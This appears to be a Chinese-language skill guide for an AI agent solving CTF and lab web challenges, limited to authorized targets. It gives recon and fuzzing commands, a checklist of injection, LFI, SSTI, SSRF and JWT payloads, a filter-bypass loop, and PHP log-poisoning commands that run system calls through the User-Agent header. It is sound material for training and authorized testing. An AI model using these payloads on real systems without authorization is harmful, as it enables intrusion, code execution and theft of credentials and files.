---
name: ctf-web
description: CTF 与靶场的 Web 方向自主解题：信息收集、目录与参数爆破、注入/包含/上传/反序列化/SSTI/SSRF/JWT 的验证与利用、以及从源码与响应差异中定位真 flag。适用于 Web 类题目与授权站点测试。
license: MIT
compatibility: 仅限 CTF / 靶场 / 授权站点
---

# CTF Web 自主解题

执行者视角：**直接发请求、直接看响应差异**，不要输出分析报告后就停。

## 0. 动手前门禁（跳过这三步 = 白干）

### 0.1 先读现成资料
任务目录 `uploads/`、`/app/data/tasks/<id>/` 下若有 **wp / writeup / 题解 / 说明 / pdf / md**，**先读完再动手**。
有参考答案却自己硬试是严重失职。PDF 读出不乱码的方法：
```bash
python3 -c "
import zlib,re
d=open('wp.pdf','rb').read()
for m in re.finditer(rb'stream\r?\n', d):
    try: dec=zlib.decompress(d[m.end():d.find(b'endstream',m.end())])
    except: continue
    for s in re.findall(rb'\((?:\\.|[^()\\\\])*\)', dec): print(s[1:-1].decode('latin-1','replace'), end='')
"
# 或直接渲染成图看
pdftoppm -png -r 120 wp.pdf out 2>/dev/null || echo "用 Read 工具读图"
```

### 0.2 先确认传输编码（最常被忽略的坑）
目标是 **WebSocket / 自定义隧道 / 非标准端口** 时，先确认传输层编码并**正确解包**，再谈分析。

```python
# chunked 解码（必须做，否则所有"响应长度/内容"结论都是错的）
def dechunk(body: bytes) -> bytes:
    out = b""
    while True:
        i = body.find(b"\r\n")
        if i < 0: break
        try: n = int(body[:i].split(b";")[0].strip(), 16)
        except ValueError: break
        body = body[i+2:]
        if n == 0: break
        out += body[:n]; body = body[n+2:]
    return out
```

**症状识别**：
- 响应里出现**孤立的十六进制行**（`3ac`、`14`、`0`）= **chunked 没解**
- 必须先写一个能稳定拿到**干净响应**的客户端，再开始攻击

```bash
# 检查响应头是否 chunked
curl -sSik http://TARGET/ | head -8 | grep -i transfer-encoding
# curl 会自动解 chunked；自己手写 socket/WS 客户端时不会，必须显式解
```

### 0.3 先归纳服务端规律
同类请求**至少对比 3 次**，用【响应差异】推规律再决定方向。

- **多个不同输入返回完全相同输出 → 先怀疑有过滤/诱饵**，不要当成正常结果继续推
- 判据示例（`?file=` 型题目）：
  ```
  file=/proc/version      → 1174B  真内容
  file=/etc/passwd        →   20B  同一小串
  file=flag               →   20B  同一小串   ← 含关键字就回诱饵
  ```
  → 规律是「**含 flag 关键字返回诱饵**」，不是「文件内容就是这串」

## 1. 信息收集（5 分钟内出结论）

```bash
curl -sSik http://TARGET/ | head -40
whatweb -a 3 http://TARGET/ 2>/dev/null || true
for p in robots.txt sitemap.xml .git/HEAD .env www.zip backup.zip flag flag.txt \
         index.php login.php admin/ api/ source/ src/ ; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://TARGET/$p"); echo "$code  $p"
done
```

- 重点看 **HTTP 状态码差异**：200/301/403/404 的边界就是路径地图。
- 有源码先读源码（`.git`、备份包、`www.zip`）；有源码就不要盲注。

## 2. 目录 / 文件 / 参数爆破（放后台跑，别阻塞）

```bash
WL=${SECLISTS:-/opt/ctf/seclists}/Discovery/Web-Content
ffuf -s -w $WL/raft-medium-directories.txt -u http://TARGET/FUZZ \
     -mc 200,204,301,302,307,401,403 -t 40 -o /app/data/tasks/TID/dirs.json
ffuf -s -w $WL/burp-parameter-names.txt -u "http://TARGET/page?FUZZ=1" -fs 0
```

## 3. 分方向验证清单（按证据选，不靠猜）

| 证据（真实观察） | 方向 | 最小验证 |
|---|---|---|
| 输入回显到 HTML/JS/属性 | XSS | 发 `<svg onload=alert(1)>`，看是否原样回显且未编码 |
| `?id=1` 报 SQL 语法错误 / 布尔差异 | SQLi | `id=1 and 1=1` vs `id=1 and 1=2`；再 `sqlmap -u "URL" --batch --level 3` |
| `?file=` / `?page=` 能读文件 | LFI | `../../etc/passwd`；被过滤时试 `php://filter`、**大写变形**、双重编码、`/proc/self/environ`（见 §4） |
| `{{7*7}}` 回显 49 | SSTI | `{{7*7}}` → `{{config}}` → 按引擎（Jinja2/Twig）上 RCE payload |
| 有 URL 参数请求远端 | SSRF | 打 `http://127.0.0.1:80`、`file:///etc/passwd`、云元数据 `169.254.169.254` |
| 文件上传 | 上传绕过 | 改 Content-Type、双后缀、`.phtml/.phar`、图片马 + 文件包含 |
| `unserialize` / 序列化 cookie | 反序列化 | 找 `__wakeup/__destruct` POP 链；先构造无害对象确认可达 |
| JWT（`eyJ...`） | 认证绕过 | `alg:none`、弱密钥爆破（`hashcat -m 16500`）、`flask-unsign` |
| 只有前端校验 / 权限位 | 越权 IDOR | 改 id/uid/team_id，对比不同账号响应 |

**纪律**：先用一次请求确认漏洞点**存在**，再写利用脚本。不要一上来打全量 payload。

## 4. LFI 遇到过滤时（诱饵/关键字拦截）

**先判断是「读不到」还是「被换成诱饵」**：读一个**必然存在且含高熵内容**的文件做对照。

```bash
# 对照组：/proc 通常不被过滤，且内容唯一，用来证明"确实读到了"
curl -s "http://TARGET/?file=/proc/version"     # 应含 Linux version
curl -s "http://TARGET/?file=/proc/self/cmdline" # 应含进程命令行
curl -s "http://TARGET/?file=/etc/passwd"        # 若与上面长度差异悬殊 → 可疑
```

**只返回一小段固定字符串** = 服务端在**拦截并回诱饵**，不是文件内容。此时：

### 4.1 ⭐ 第一步永远是「关键字变形矩阵」，不要只试一种就下结论

**实战教训（fufu 题）**：只试了小写 `php://filter` 被拦，就误判成"路径白名单、只有 /proc 可读"，
于是放弃。真相是**关键字黑名单只匹配小写**——把 `php` 写成 `PHP` 就绕过了。

```bash
KEY="php"   # 或 flag / etc / passwd / log …
# 必须把下列变形全试一遍，再下结论
for v in "php" "PHP" "Php" "pHp" "ph%70" "%70hp" "p%68p" "ph\\p" "ph p"; do
  echo "--- $v://filter/convert.base64-encode/resource=/proc/version"
  curl -s "http://TARGET/?file=$v://filter/convert.base64-encode/resource=/proc/version" | head -c 200; echo
done
```

**要点**：
- **PHP 流包装器名大小写不敏感** → `PHP://` `Php://` `pHP://` 都合法，而朴素的 `strpos($x,'php')` 只拦小写
- **别只测一个词就推全局规则**：分别测 `flag`、`php`、`passwd`、`etc`、`log`，看**命中哪个才回诱饵**
- **诱饵判定**：多次不同输入返回**完全相同的短串** = 诱饵，不是文件内容

### 4.2 确认是黑名单后，按序尝试

| 手法 | 载荷 |
|---|---|
| 大小写变形 | `PHP://`、`Flag`、`FLAG`、`PassWd` |
| URL 编码 | `%70hp://`、`fl%61g` |
| 借 proc 做路径别名 | `/proc/self/root/etc/passwd`、`/proc/1/root/<path>`、`/proc/self/cwd/<path>` |
| 伪协议 | `PHP://filter/convert.base64-encode/resource=<file>`、`data://`、`php://input` |
| 目录穿越 | `....//`、`..%2f` |

### 4.3 日志投毒（LFI + include 时的通杀手法）

**前提**：应用对读到的文件做 `include`/`require`（不是 `echo file_get_contents`）。

**⭐ 关键：payload 必须放在「不被 URL 编码」的位置**

```bash
# ❌ 错：放 URL 参数里，`<?php` 会被编码成 %3C%3Fphp，写进日志的不是合法 PHP
curl -s "http://TARGET/?file=<?php+system('id');?>"

# ✅ 对：放 User-Agent / Referer / Cookie —— nginx 原样记录，不做 URL 编码
curl -s "http://TARGET/" -H 'User-Agent: {<?php system("cat /flag"); ?>}'
curl -s "http://TARGET/" -H 'User-Agent: {<?php system("cat /flag*"); ?>}'   # 文件名不确定时用通配

# 触发（读日志 → 被 include → 代码执行）
curl -s "http://TARGET/?file=/var/log/nginx/access.log"
```

**日志路径候选**：
```
/var/log/nginx/access.log       /var/log/nginx/error.log
/var/log/apache2/access.log     /var/log/httpd/access_log
/var/log/nginx/access_log       /usr/local/nginx/logs/access.log
/proc/self/fd/1  /proc/self/fd/2      # 进程 stdout/stderr 也可能是日志
```

**⚠️ 自污染陷阱（踩过，代价极大）**：
反复发带畸形 payload 的请求，会把**自己的测试噪音**写进日志；日志被 include 时
**某一行畸形 PHP 会导致整份 `include` 编译失败 → 白屏**，之后所有读取都失败。

**遇到这种情况立刻停手**，不要继续换 payload 硬试（那只会写进更多噪音）：
1. **先用不含 PHP 标签的读取确认日志本身可读**（例如读日志尾部、只看长度变化）
2. 换个**干净的日志文件**（access.log → error.log，或 fd/1、fd/2）
3. 换**不被 URL 编码的注入位置**（UA → Referer → Cookie）
4. **一行内闭合**：`{<?php system("cat /flag"); ?>}` 用 `{}` 包住避免与相邻日志字段粘连
5. 换**其它 sink**：`/proc/self/environ`（若含可控变量）、session 文件、上传目录

**判据**：「读日志返回空/白屏」是**日志被污染**，不是"路径不对"——
这时该换 sink，而不是继续试路径变体。

### 4.4 真 flag 常在"不叫 flag"的文件里

`/var/log/*`、`readme.txt`、`.env`、`config.php`、`hint.txt`、`/proc/1/environ`、
`/proc/1/cmdline`（进程环境变量/命令行参数）。

**确认是真 flag**：按题目要求提交判真（`ctf-solve` 的判真协议），
不要看到第一个 `XXX{...}` 就当答案——**题目可能故意放多个 decoy**。

## 5. 留证纪律（避免目录变脏）

```bash
mkdir -p /tmp/artex-work          # 中间产物都放这里
# 只把结论性证据落任务目录，且合并到一个文件
echo "## 步骤1：确认 chunked" >> /app/data/tasks/TID/evidence.md
curl -sSik "URL" | head -30       >> /app/data/tasks/TID/evidence.md
```

- **不要为每个请求单独存文件**（`resp_1.txt`、`resp_2.txt`… 会让目录变成垃圾场）
- `report_finding` 的 evidence 字段粘贴**原始请求 + 原始响应**，不要写"访问后得到 flag"
